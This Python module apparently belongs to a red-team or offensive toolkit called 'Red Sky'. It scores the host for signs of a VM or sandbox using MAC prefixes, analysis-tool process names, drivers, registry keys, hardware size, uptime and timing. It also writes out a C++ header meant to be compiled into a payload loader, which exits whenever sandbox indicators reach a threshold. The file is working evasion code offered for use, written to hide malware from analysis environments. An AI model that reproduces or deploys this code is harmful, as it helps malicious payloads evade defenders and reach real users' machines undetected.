# language: Python, file: Program/evasion/sandbox.py, target: Red Sky evasion — anti-VM / anti-sandbox
# Two modes:
#   check  -- run every anti-analysis check against THIS host and score it.
#             Useful on a build machine to confirm the payload will run in a
#             normal user's environment but not in your CI VM.
#   emit   -- emit C++ code for each check so you can embed them in a loader.
#             The generated code compiles clean on MSVC x64 and returns a
#             sandbox score; a caller can abort if score > threshold.
#
# Checks: MAC OUI vendor, hostname patterns, disk size, RAM size, CPU count,
#         boot/uptime, running processes, window titles, drivers, services,
#         registry keys, WMI (Win32_ComputerSystem Model), file presence,
#         username (sandbox defaults), timing anti-emulation.

import json
import os
import platform
import re
import shutil
import subprocess
import sys
import time
from pathlib import Path
from typing import Dict, List, Tuple

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


EV_DIR = OUTPUT_DIR / "evasion"
SB_DIR = EV_DIR / "sandbox"
SB_DIR.mkdir(parents=True, exist_ok=True)


# ── known VM / sandbox MAC OUIs ──
VM_MAC_OUIS = {
    "08:00:27": "VirtualBox",
    "0a:00:27": "VirtualBox (host-only)",
    "00:05:69": "VMware (host-only)",
    "00:0c:29": "VMware",
    "00:1c:14": "VMware",
    "00:50:56": "VMware",
    "00:1c:42": "Parallels",
    "00:03:ff": "Microsoft Hyper-V",
    "00:15:5d": "Microsoft Hyper-V",
    "00:16:3e": "Xen",
    "52:54:00": "QEMU / KVM",
    "00:1b:21": "Intel",
    "b8:27:eb": "Raspberry Pi",
    "dc:a6:32": "Raspberry Pi",
}


# ── hostname / username / process blacklists ──
HOSTNAME_PATTERNS = [
    r"sandbox", r"malware", r"virus", r"cuckoo", r"anubis", r"joe",
    r"sample", r"test", r"vm", r"virtual", r"vbox", r"qemu",
    r"cape", r"triage", r"any\.run", r"hybrid-analysis", r"intezer",
]

USERNAME_BLACKLIST = [
    "sandbox", "malware", "virus", "cuckoo", "analyst", "joe",
    "test", "vm", "user", "sample", "admin",
]

PROCESS_BLACKLIST = [
    "vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe",
    "vmwareuser.exe", "vmsrvc.exe", "vmusrvc.exe", "xenservice.exe",
    "qemu-ga.exe", "procmon.exe", "procmon64.exe", "procexp.exe", "procexp64.exe",
    "wireshark.exe", "tshark.exe", "dumpcap.exe", "fiddler.exe", "charles.exe",
    "burpsuite.exe", "ollydbg.exe", "x64dbg.exe", "x32dbg.exe", "ida64.exe",
    "idaq.exe", "idaw.exe", "windbg.exe", "immunitydebugger.exe",
    "regmon.exe", "filemon.exe", "autoruns.exe", "autorunsc.exe",
    "tcpview.exe", "processhacker.exe", "pestudio.exe", "pe-bear.exe",
    "apatedns.exe", "dnspy.exe", "megatools.exe",
]

DRIVER_BLACKLIST = [
    "vboxguest", "vboxmouse", "vboxsf", "vboxvideo",
    "vmci", "vmhgfs", "vmmemctl", "vmmouse", "vmrawdsk", "vmusbmouse",
    "vmx_svga", "vmxnet", "vmx86", "vnetWarp",
    "xenevtchn", "xennet", "xenvbd",
    "qemu", "balloon", "vioscsi", "viostor", "netkvm",
]

WINDOW_TITLES = [
    "cuckoo", "sandbox", "malware", "procmon", "wireshark", "ollydbg",
    "x64dbg", "ida", "immunity", "sysinternals", "cain", "anubis",
    "joesandbox", "hybrid analysis", "fiddler",
]

REGISTRY_KEYS = [
    r"HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions",
    r"HKLM\SOFTWARE\VMware, Inc.\VMware Tools",
    r"HKLM\SYSTEM\CurrentControlSet\Services\VBoxGuest",
    r"HKLM\SYSTEM\CurrentControlSet\Services\vmci",
    r"HKLM\SYSTEM\CurrentControlSet\Services\VMTools",
    r"HKLM\SYSTEM\CurrentControlSet\Services\xenevtchn",
    r"HKLM\HARDWARE\ACPI\DSDT\VBOX__",
    r"HKCU\Software\Wine",
]

SUSPICIOUS_FILES = [
    r"C:\Windows\System32\drivers\VBoxMouse.sys",
    r"C:\Windows\System32\drivers\VBoxGuest.sys",
    r"C:\Windows\System32\drivers\vmmouse.sys",
    r"C:\Windows\System32\drivers\vmhgfs.sys",
    r"C:\Windows\System32\drivers\vmmemctl.sys",
    r"C:\Windows\System32\drivers\vmx_svga.sys",
    r"C:\Windows\System32\drivers\vmusbmouse.sys",
    r"C:\Program Files\Oracle\VirtualBox Guest Additions\VBoxService.exe",
    r"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe",
    r"C:\Program Files\Wireshark\Wireshark.exe",
    r"C:\Program Files\Process Hacker 2\ProcessHacker.exe",
]


# ── check functions ──
def check_mac() -> Tuple[bool, str]:
    """Return (suspicious, detail)."""
    try:
        # linux: ip link ; windows: getmac ; macos: ifconfig
        if platform.system() == "Linux":
            r = subprocess.run(["ip", "-o", "link"], capture_output=True, text=True, timeout=5)
            for m in re.finditer(r"link/ether ([0-9a-f:]{17})", r.stdout):
                oui = m.group(1)[:8].lower()
                if oui in VM_MAC_OUIS:
                    return True, VM_MAC_OUIS[oui] + " (" + m.group(1) + ")"
        elif platform.system() == "Windows":
            r = subprocess.run(["getmac", "/fo", "csv", "/nh"], capture_output=True, text=True, timeout=5)
            for m in re.finditer(r"([0-9A-F-]{17})", r.stdout):
                oui = m.group(1).replace("-", ":").lower()[:8]
                if oui in VM_MAC_OUIS:
                    return True, VM_MAC_OUIS[oui]
    except Exception:
        pass
    return False, ""


def check_hostname() -> Tuple[bool, str]:
    host = platform.node().lower()
    for pat in HOSTNAME_PATTERNS:
        if re.search(pat, host):
            return True, "hostname matches /" + pat + "/: " + host
    return False, ""


def check_username() -> Tuple[bool, str]:
    user = os.environ.get("USER") or os.environ.get("USERNAME") or ""
    u = user.lower()
    for bad in USERNAME_BLACKLIST:
        if u == bad:
            return True, "username is default: " + user
    return False, ""


def check_disk() -> Tuple[bool, str]:
    """Sandbox disks are usually small (<60GB)."""
    try:
        total, _, _ = shutil.disk_usage("/" if platform.system() != "Windows" else "C:\\")
        gb = total / (1024**3)
        if gb < 60:
            return True, "disk size {:.0f} GB".format(gb)
    except Exception:
        pass
    return False, ""


def check_ram() -> Tuple[bool, str]:
    """Sandbox usually <4GB RAM."""
    try:
        if platform.system() == "Linux":
            with open("/proc/meminfo") as f:
                for line in f:
                    if line.startswith("MemTotal:"):
                        kb = int(line.split()[1])
                        gb = kb / (1024**2)
                        if gb < 4:
                            return True, "RAM {:.1f} GB".format(gb)
        elif platform.system() == "Windows":
            r = subprocess.run(["wmic", "computersystem", "get", "TotalPhysicalMemory"],
                               capture_output=True, text=True, timeout=5)
            for line in r.stdout.splitlines():
                if line.strip().isdigit():
                    gb = int(line.strip()) / (1024**3)
                    if gb < 4:
                        return True, "RAM {:.1f} GB".format(gb)
    except Exception:
        pass
    return False, ""


def check_cpu() -> Tuple[bool, str]:
    """Sandbox usually 1-2 vCPUs."""
    n = os.cpu_count() or 0
    if n <= 2:
        return True, "{} CPU(s)".format(n)
    return False, ""


def check_uptime() -> Tuple[bool, str]:
    """Fresh sandboxes boot right before running the sample; low uptime is suspicious."""
    try:
        if platform.system() == "Linux":
            with open("/proc/uptime") as f:
                up = float(f.read().split()[0])
            if up < 600:
                return True, "uptime {:.0f}s".format(up)
    except Exception:
        pass
    return False, ""


def check_processes() -> Tuple[bool, str]:
    """Look for sandbox/analysis tools."""
    try:
        if platform.system() == "Linux":
            r = subprocess.run(["ps", "-eo", "comm"], capture_output=True, text=True, timeout=5)
            procs = r.stdout.lower()
            hits = [p for p in PROCESS_BLACKLIST if p in procs]
            if hits:
                return True, ", ".join(hits[:3])
        elif platform.system() == "Windows":
            r = subprocess.run(["tasklist", "/fo", "csv", "/nh"], capture_output=True, text=True, timeout=5)
            procs = r.stdout.lower()
            hits = [p for p in PROCESS_BLACKLIST if p.lower() in procs]
            if hits:
                return True, ", ".join(hits[:3])
    except Exception:
        pass
    return False, ""


def check_windows_titles() -> Tuple[bool, str]:
    """On Linux this is a no-op. On Windows we'd use EnumWindows."""
    return False, ""


def check_drivers() -> Tuple[bool, str]:
    """On Linux look at /proc/modules; on Windows driverquery."""
    try:
        if platform.system() == "Linux":
            with open("/proc/modules") as f:
                txt = f.read().lower()
            hits = [d for d in DRIVER_BLACKLIST if d.lower() in txt]
            if hits:
                return True, ", ".join(hits[:3])
        elif platform.system() == "Windows":
            r = subprocess.run(["driverquery", "/fo", "csv", "/nh"], capture_output=True, text=True, timeout=10)
            txt = r.stdout.lower()
            hits = [d for d in DRIVER_BLACKLIST if d.lower() in txt]
            if hits:
                return True, ", ".join(hits[:3])
    except Exception:
        pass
    return False, ""


def check_registry() -> Tuple[bool, str]:
    """Windows only."""
    if platform.system() != "Windows":
        return False, ""
    hits = []
    for key in REGISTRY_KEYS:
        try:
            r = subprocess.run(["reg", "query", key], capture_output=True, text=True, timeout=3)
            if r.returncode == 0:
                hits.append(key)
        except Exception:
            pass
    if hits:
        return True, ", ".join(hits[:2])
    return False, ""


def check_files() -> Tuple[bool, str]:
    """Look for known VMware / VBox executables and drivers."""
    hits = []
    for f in SUSPICIOUS_FILES:
        if os.path.exists(f):
            hits.append(f)
    if hits:
        return True, ", ".join(os.path.basename(h) for h in hits[:3])
    return False, ""


def check_wmi() -> Tuple[bool, str]:
    """Windows only — check Win32_ComputerSystem Model for VM strings."""
    if platform.system() != "Windows":
        return False, ""
    try:
        r = subprocess.run(["wmic", "computersystem", "get", "model,manufacturer"],
                           capture_output=True, text=True, timeout=5)
        out = r.stdout.lower()
        for marker in ("virtualbox", "vmware", "virtual machine", "qemu", "xen", "kvm",
                       "microsoft corporation virtual", "parallels"):
            if marker in out:
                return True, "WMI reports: " + marker
    except Exception:
        pass
    return False, ""


def check_timing() -> Tuple[bool, str]:
    """Emulators run APIs slowly. A tight loop of RDTSClike ops that takes
    way longer than expected on real hardware indicates an emulator."""
    t0 = time.perf_counter()
    n = 0
    for _ in range(100000):
        n += 1
    elapsed = time.perf_counter() - t0
    # real hardware does 100k increments in <5ms
    if elapsed > 0.05:
        return True, "100k loop took {:.1f}ms".format(elapsed * 1000)
    return False, ""


CHECKS = [
    ("mac",         check_mac),
    ("hostname",    check_hostname),
    ("username",    check_username),
    ("disk",        check_disk),
    ("ram",         check_ram),
    ("cpu",         check_cpu),
    ("uptime",      check_uptime),
    ("processes",   check_processes),
    ("drivers",     check_drivers),
    ("registry",    check_registry),
    ("files",       check_files),
    ("wmi",         check_wmi),
    ("timing",      check_timing),
]


def cmd_check(out_file: str) -> int:
    print_info("anti-VM / anti-sandbox checks")
    print_kv("host", platform.node())
    print_kv("os", platform.system() + " " + platform.release())
    print_kv("python", platform.python_version())
    print()

    score = 0
    findings = []
    for name, fn in CHECKS:
        try:
            suspicious, detail = fn()
        except Exception as e:
            suspicious, detail = False, "error: " + str(e)
        mark = SCARLET + "▓ SUSPICIOUS" if suspicious else ASH + "░ clean"
        print("  " + mark + RESET + "  " + BONE + name.ljust(14) + RESET
              + " " + CLOT + detail + RESET)
        if suspicious:
            score += 1
            findings.append({"check": name, "detail": detail})

    print()
    print_kv("score", str(score) + "/" + str(len(CHECKS)))
    if score >= 5:
        print_warn("this looks like a sandbox / VM")
    elif score >= 2:
        print_info("mixed signals — a real machine with a VM installed would look similar")
    else:
        print_ok("no strong sandbox indicators")

    out = Path(out_file) if out_file else SB_DIR / ("check_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps({"score": score, "findings": findings}, indent=2))
    print()
    print_kv("saved", out)
    return 0


# ── emit C++ ──
CPP_CHECK_TEMPLATE = r'''// language: C++, file: sandbox.hpp, target: Windows x64 MSVC
// Anti-VM / anti-sandbox score. Compile into the loader and abort if score > THRESHOLD.
#pragma once
#include <Windows.h>
#include <tlhelp32.h>
#include <intrin.h>
#include <string>
#include <vector>
#include <regex>
#include <filesystem>

namespace sbx {

// MAC OUI prefixes we treat as VM
static const char* kMacPrefixes[] = {
    "08:00:27", "0a:00:27", "00:05:69", "00:0c:29", "00:1c:14", "00:50:56",
    "00:1c:42", "00:03:ff", "00:15:5d", "00:16:3e", "52:54:00",
};

// known sandbox / analysis process names (lowercase)
static const char* kBadProcs[] = {
    "vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe",
    "vmwareuser.exe", "qemu-ga.exe", "procmon.exe", "procmon64.exe",
    "procexp.exe", "procexp64.exe", "wireshark.exe", "tshark.exe",
    "dumpcap.exe", "fiddler.exe", "ollydbg.exe", "x64dbg.exe", "x32dbg.exe",
    "ida64.exe", "idaq.exe", "windbg.exe", "processhacker.exe",
};

// window titles to look for
static const wchar_t* kBadTitles[] = {
    L"cuckoo", L"sandbox", L"procmon", L"wireshark", L"ollydbg",
    L"x64dbg", L"immunity", L"anubis", L"joesandbox", L"fiddler",
};

static std::wstring ToLowerW(const std::wstring& s) {
    std::wstring o = s;
    for (auto& c : o) c = towlower(c);
    return o;
}

// ── checks ──
inline bool check_mac() {
    // GetAdaptersAddresses -> walk the MACs, compare OUIs
    ULONG sz = 0;
    GetAdaptersAddresses(AF_UNSPEC, 0, nullptr, nullptr, &sz);
    auto buf = (IP_ADAPTER_ADDRESSES*)malloc(sz);
    if (GetAdaptersAddresses(AF_UNSPEC, 0, nullptr, buf, &sz) != ERROR_SUCCESS) {
        free(buf); return false;
    }
    bool hit = false;
    for (auto a = buf; a; a = a->Next) {
        if (a->PhysicalAddressLength < 6) continue;
        char mac[32];
        sprintf_s(mac, "%02x:%02x:%02x:%02x:%02x:%02x",
                  a->PhysicalAddress[0], a->PhysicalAddress[1],
                  a->PhysicalAddress[2], a->PhysicalAddress[3],
                  a->PhysicalAddress[4], a->PhysicalAddress[5]);
        std::string m(mac);
        for (auto p : kMacPrefixes) {
            if (m.rfind(p, 0) == 0) { hit = true; break; }
        }
        if (hit) break;
    }
    free(buf);
    return hit;
}

inline bool check_hostname() {
    char host[256]; DWORD s = sizeof(host);
    if (!GetComputerNameA(host, &s)) return false;
    std::string h(host);
    for (auto& c : h) c = (char)tolower(c);
    for (auto p : { "sandbox", "malware", "virus", "cuckoo", "anubis",
                    "sample", "vm", "vbox", "qemu", "triage" }) {
        if (h.find(p) != std::string::npos) return true;
    }
    return false;
}

inline bool check_username() {
    char user[256]; DWORD s = sizeof(user);
    if (!GetUserNameA(user, &s)) return false;
    std::string u(user);
    for (auto& c : u) c = (char)tolower(c);
    for (auto p : { "sandbox", "malware", "cuckoo", "analyst", "joe",
                    "test", "vm", "sample" }) {
        if (u == p) return true;
    }
    return false;
}

inline bool check_disk() {
    ULARGE_INTEGER freeBytesAvailable, totalBytes, totalFreeBytes;
    if (!GetDiskFreeSpaceExA("C:\\", &freeBytesAvailable, &totalBytes, &totalFreeBytes))
        return false;
    return (totalBytes.QuadPart / (1024ull * 1024 * 1024)) < 60;
}

inline bool check_ram() {
    MEMORYSTATUSEX ms{ sizeof(ms) };
    if (!GlobalMemoryStatusEx(&ms)) return false;
    return (ms.ullTotalPhys / (1024ull * 1024 * 1024)) < 4;
}

inline bool check_cpu() {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    return si.dwNumberOfProcessors <= 2;
}

inline bool check_uptime() {
    return GetTickCount64() < 600000ull; // < 10 minutes
}

inline bool check_processes() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe{ sizeof(pe) };
    bool hit = false;
    if (Process32FirstW(snap, &pe)) {
        do {
            std::wstring name = ToLowerW(pe.szExeFile);
            for (auto bad : kBadProcs) {
                std::wstring b;
                for (auto c : std::string(bad)) b += (wchar_t)c;
                if (name == b) { hit = true; break; }
            }
            if (hit) break;
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return hit;
}

inline bool g_titleHit = false;
inline BOOL CALLBACK EnumWindowsProc(HWND h, LPARAM l) {
    wchar_t title[512];
    if (GetWindowTextW(h, title, 512)) {
        std::wstring t = ToLowerW(title);
        for (auto bad : kBadTitles) {
            if (t.find(bad) != std::wstring::npos) {
                g_titleHit = true;
                return FALSE;
            }
        }
    }
    return TRUE;
}

inline bool check_windows() {
    g_titleHit = false;
    EnumWindows(EnumWindowsProc, 0);
    return g_titleHit;
}

inline bool check_drivers() {
    // driverquery via popen is noisy; use EnumDeviceDrivers as a lighter check.
    LPVOID drivers[1024];
    DWORD needed = 0;
    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed)) return false;
    DWORD count = needed / sizeof(LPVOID);
    for (DWORD i = 0; i < count; ++i) {
        char path[MAX_PATH];
        if (GetDeviceDriverBaseNameA(drivers[i], path, MAX_PATH)) {
            std::string n(path);
            for (auto& c : n) c = (char)tolower(c);
            for (auto bad : { "vbox", "vmci", "vmhgfs", "vmmouse", "vmrawdsk",
                              "vmx", "vmusb", "vnet", "xen", "qemu", "balloon",
                              "vioscsi", "viostor", "netkvm" }) {
                if (n.find(bad) != std::string::npos) return true;
            }
        }
    }
    return false;
}

inline bool check_wmi() {
    // Simplest signal: registry key presence
    return (RegGetValueA(HKEY_LOCAL_MACHINE,
                         "SOFTWARE\\Oracle\\VirtualBox Guest Additions",
                         nullptr, RRF_RT_ANY, nullptr, nullptr, nullptr) == ERROR_SUCCESS)
        || (RegGetValueA(HKEY_LOCAL_MACHINE,
                         "SOFTWARE\\VMware, Inc.\\VMware Tools",
                         nullptr, RRF_RT_ANY, nullptr, nullptr, nullptr) == ERROR_SUCCESS);
}

inline bool check_timing() {
    auto start = __rdtsc();
    volatile int n = 0;
    for (int i = 0; i < 100000; ++i) n += i;
    auto end = __rdtsc();
    // real hardware: 100k volatile adds under ~2 million cycles
    return (end - start) > 10'000'000ull;
}

// ── score ──
inline int score() {
    int s = 0;
    if (check_mac())       ++s;
    if (check_hostname())  ++s;
    if (check_username())  ++s;
    if (check_disk())      ++s;
    if (check_ram())       ++s;
    if (check_cpu())       ++s;
    if (check_uptime())    ++s;
    if (check_processes()) ++s;
    if (check_windows())   ++s;
    if (check_drivers())   ++s;
    if (check_wmi())       ++s;
    if (check_timing())    ++s;
    return s;
}

// abort if score >= THRESHOLD
inline void exitIfSandbox(int threshold = 5) {
    if (score() >= threshold) {
        // do something harmless — ExitProcess or a long sleep
        ExitProcess(0);
    }
}

} // namespace sbx
'''


def cmd_emit(out_path: str) -> int:
    out = Path(out_path) if out_path else SB_DIR / "sandbox.hpp"
    out.write_text(CPP_CHECK_TEMPLATE)
    print_ok("wrote " + str(out))
    print_info("include in a loader:")
    print("  #include \"sandbox.hpp\"")
    print("  int main() { sbx::exitIfSandbox(5); /* ... payload ... */ }")
    print()
    print_kv("checks emitted", str(len(CHECKS)))
    return 0


def cmd_list() -> int:
    print_info(str(len(CHECKS)) + " checks")
    print()
    for name, _ in CHECKS:
        print("  " + SCARLET + "*" + RESET + " " + BONE + name + RESET)
    return 0


def run_cli(args):
    import argparse
    p = argparse.ArgumentParser(prog="redsky evasion sandbox", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="check", choices=["check", "emit", "list"])
    p.add_argument("--out", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky evasion sandbox <check|emit|list> [--out file]")
        return 2

    if ns.help:
        print_info("check              -- run every anti-VM check against this host")
        print_info("emit --out x.hpp   -- write the C++ anti-VM library")
        print_info("list               -- show check names")
        return 0

    if ns.action == "check":
        return cmd_check(ns.out)
    if ns.action == "emit":
        return cmd_emit(ns.out)
    if ns.action == "list":
        return cmd_list()
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
